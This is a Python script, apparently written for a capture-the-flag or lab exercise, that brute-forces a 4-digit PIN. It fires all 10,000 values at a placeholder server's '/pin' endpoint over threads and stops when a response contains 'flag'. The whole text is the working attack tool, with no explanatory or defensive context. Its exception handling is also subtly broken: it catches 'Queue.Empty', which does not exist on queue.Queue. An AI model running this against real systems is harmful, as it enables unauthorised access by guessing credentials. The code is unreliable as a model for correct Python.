import requests
import threading
from queue import Queue
base_url = 'http://SERVER-IP:PORT/pin?pin='
num_threads = 1  # Adjust this based on your needs
pin_queue = Queue()
found_event = threading.Event()
print_lock = threading.Lock()

# Generate all possible 4-digit PINs and add to queue
for pin in range(10000):
    pin_queue.put(f"{pin:04}")

def check_pin():
    while not found_event.is_set():
        try:
            pin = pin_queue.get_nowait()
        except Queue.Empty:
            break
            
        try:
            response = requests.get(base_url + pin, timeout=5)
            if 'flag' in response.text:
                with print_lock:
                    print(f"\n[+] Correct PIN found: {pin}")
                    print(f"Response: {response.text}")
                found_event.set()
                break
            else:
                with print_lock:
                    print(f"Trying PIN: {pin} - Incorrect", end='\r')
        except Exception as e:
            with print_lock:
                print(f"Error with PIN {pin}: {str(e)}")
        
        pin_queue.task_done()

# Create and start threads
threads = []
for _ in range(num_threads):
    t = threading.Thread(target=check_pin)
    t.start()
    threads.append(t)

# Wait for all threads to complete
for t in threads:
    t.join()

if not found_event.is_set():
    print("\n[!] Correct PIN not found in range")
